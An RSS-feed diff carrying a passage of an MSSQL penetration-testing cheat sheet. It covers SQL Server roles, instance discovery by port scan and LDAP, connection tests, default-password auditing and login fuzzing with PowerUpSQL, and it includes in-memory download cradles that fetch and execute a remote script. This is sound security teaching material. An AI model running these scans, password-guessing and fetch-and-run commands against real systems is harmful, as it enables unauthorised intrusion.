@@ -1,0 +1,925 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>MSSQL | Giovanni Pecoraro</title><link>https://www.peco602.com/tag/mssql/</link><atom:link href="https://www.peco602.com/tag/mssql/index.xml" rel="self" type="application/rss+xml"/><description>MSSQL</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Thu, 22 Sep 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>MSSQL</title><link>https://www.peco602.com/tag/mssql/</link></image><item><title>Microsoft SQL Server (MSSQL) Cheatsheet</title><link>https://www.peco602.com/post/0070-mssql-cheatsheet/</link><pubDate>Thu, 22 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0070-mssql-cheatsheet/</guid><description>&lt;p>&lt;strong>What is SQL Server?&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>A database platform&lt;/li>
+&lt;li>A Windows application&lt;/li>
+&lt;li>A set of Windows Services&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img src="./mssql_structure.png" alt="MSSQL Structure" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;em>Important Notes&lt;/em>&lt;/p>
+&lt;ul>
+&lt;li>OS command are usually executed as the service account&lt;/li>
+&lt;li>The service account is a &lt;strong>sysadmin&lt;/strong> by default&lt;/li>
+&lt;li>Clustered servers are required to have the same service account&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>How do I authenticate?&lt;/strong>&lt;/p>
+&lt;p>Account Types:&lt;/p>
+&lt;ul>
+&lt;li>Windows Account:
+&lt;ul>
+&lt;li>Used to login&lt;/li>
+&lt;li>Mapped to SQL Server login&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>SQL Server Login
+&lt;ul>
+&lt;li>Used to login&lt;/li>
+&lt;li>Mapped to database account&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Database User
+&lt;ul>
+&lt;li>Used to access databases&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img src="./mssql_authentication.png" alt="MSSQL Authentication" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;strong>Important Roles&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Server Roles:
+&lt;ul>
+&lt;li>Sysadmin = Database Administrator&lt;/li>
+&lt;li>Public Role = Everyone with CONNECT&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Database Roles:
+&lt;ul>
+&lt;li>Database Owner = SQL login that owns the database ☺&lt;/li>
+&lt;li>DB_OWNER role = Allows members to take most actions in the database&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.&lt;/p>
+&lt;h2 id="powerupsql-setup">PowerUpSQL Setup&lt;/h2>
+&lt;ol>
+&lt;li>All possible setup options:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Download to Disk + Import Module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Download from https://github.com/NetSPI/PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Download/Import to Memory: Download Cradle 1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">IEX&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Download/Import to Memory: Common Download Cradle 2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;amp;([&lt;/span>&lt;span class="no">scriptblock&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nb">new-object&lt;/span> &lt;span class="n">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">webclient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">downloadstring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Install Module from PowerShell Gallery&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Install-Module&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;li>List all PowerUpSQL available functions:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-Command&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">Module&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-Help&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">FUNCTION_NAME&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-Full&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="discovery">Discovery&lt;/h2>
+&lt;h3 id="net-classes---remote-discovery">.NET Classes - Remote Discovery&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="no">System.Data.Sql.SqlDataSourceEnumerator&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Instance&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetDataSources&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="local-discovery">Local Discovery&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Local User&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: Locate services and registry keys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceLocal&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="remote-discovery">Remote Discovery&lt;/h3>
+&lt;p>List SQL Servers using UDP port scan:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: UDP port scan&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceScanUDP&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceScanUDPThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get the instance list from a file &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceFile&lt;/span> &lt;span class="n">-FilePath&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">temp&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">computers&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLInstanceScanUDPThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List SQL Servers using UDP broadcast ping:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: UDP broadcast ping&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceBroadcast&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List SQL Servers using TCP port scan (MSSQL exposes port 1433):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: TCP port scan&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-PortScan&lt;/span> &lt;span class="n">-StartAddress&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">START_IP_ADDRESS&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-EndAddress&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">END_IP_ADDRESS&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">-ScanPort&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="mf">1433&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerSploit&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: TCP port scan&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-PortScan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="mf">1433&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$result&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Invoke-PortScan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$result&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">hostname&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List Active Directory Domain SQL Server Instances:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Using current domain credentials:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Domain User&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Technique: Query ADS via LDAP for SPNs&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List SQL Server instances running as a specific domain account&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-DomainAccount&lt;/span> &lt;span class="s2">&amp;#34;SQLSvc&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List shared domain user SQL Server service accounts (not machine account &amp;#34;*$&amp;#34;):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Group-Object&lt;/span> &lt;span class="n">DomainAccount&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Sort-Object&lt;/span> &lt;span class="n">count&lt;/span> &lt;span class="n">-Descending&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Count&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Name&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">name&lt;/span> &lt;span class="o">-notlike&lt;/span> &lt;span class="s2">&amp;#34;*$&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-and&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">count&lt;/span> &lt;span class="o">-gt&lt;/span> &lt;span class="mf">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Using alternative domain credentials:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">runas&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">noprofile&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">netonly&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;CYBERCORP\STUDENT1&amp;#34;&lt;/span> &lt;span class="n">PowerShell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-DomainController&lt;/span> &lt;span class="s2">&amp;#34;CYBERCORP-DC.CYBERCORP.LOCAL&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERCORP\STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-password&lt;/span> &lt;span class="s2">&amp;#34;PASSWORD&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h2 id="initial-access">Initial Access&lt;/h2>
+&lt;p>&lt;strong>How do I get access?&lt;/strong>&lt;/p>
+&lt;p>Common Methods:&lt;/p>
+&lt;ul>
+&lt;li>Attempt to login with local or domain user privileges (Very Common)&lt;/li>
+&lt;li>Computer accounts work too ☺&lt;/li>
+&lt;li>Weak SQL Server login passwords&lt;/li>
+&lt;li>Default SQL Server login passwords&lt;/li>
+&lt;li>Default SQL Server login passwords associated with 3rd party applications&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>Why can domain users log to SQL Server?&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Domain users added to role (Week devops)&lt;/li>
+&lt;li>Local users added to role&lt;/li>
+&lt;li>Privilege inheritance (Mostly express versions)&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="d-flex justify-content-center">
+&lt;div class="w-100" >&lt;img src="./mssql_users.png" alt="MSSQL Users" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h3 id="check-sql-server-accessibility">Check SQL Server accessibility&lt;/h3>
+&lt;h4 id="unauthenticated-user">Unauthenticated user&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Unauthenticated&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceUDPScan&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">15&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;testuser&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;testpass&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="local-user">Local user&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Local User&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceLocal&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="domain-user">Domain user&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Domain User&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get a list of domain SQL servers that can be logged into with a provided SQL Server login&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-username&lt;/span> &lt;span class="s2">&amp;#34;testuser&amp;#34;&lt;/span> &lt;span class="n">-password&lt;/span> &lt;span class="s2">&amp;#34;testpass&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="alternative-domain-user">Alternative domain user&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># OS Authentication Level: Alternative Domain User&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">runas&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">noprofile&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">netonly&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">domain&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">user&lt;/span> &lt;span class="n">PowerShell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get a list of domain SQL servers that can be logged into using an alternative domain account from a non domain system.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">runas&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">noprofile&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">netonly&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="s2">&amp;#34;CYBERCORP\STUDENT1&amp;#34;&lt;/span> &lt;span class="n">PowerShell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-DomainController&lt;/span> &lt;span class="s2">&amp;#34;CYBERCORP-DC.CYBERCORP.LOCAL&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERCORP\STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-password&lt;/span> &lt;span class="s2">&amp;#34;PASSWORD&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLConnectionTestThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">15&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="password-guessing">Password Guessing&lt;/h3>
+&lt;p>Discover domain SQL Servers and determine if they are configured with default passwords used by common 3rd party applications based on the instance name (it covers 41 application specific default SQL Server instances, users and passwords):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceLocal&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-SQLAuditDefaultLoginPw&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-SQLAuditDefaultLoginPw&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is possible to create a user list using the following methods:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Enumerates SQL Server Logins based on login id using SUSER_NAME() and only the Public role:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLFuzzServerLogin&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Enumerates &lt;strong>domain groups&lt;/strong>, &lt;strong>computer accounts&lt;/strong>, and &lt;strong>user accounts&lt;/strong> based on domain RID using SUSER_SNAME() and only the Public role. Note: In a typical domain 10000 or more is recommended for the EndId. (Blindly enumerate domain users and group associated with the SQL Server domain with least privilege SQL login):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLFuzzDomainAccount&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-StartId&lt;/span> &lt;span class="mf">500&lt;/span> &lt;span class="n">-EndId&lt;/span> &lt;span class="mf">10000&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Enumerate all SQL Logins as least privilege user and test username as password (Custom user/password lists can also be provided):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
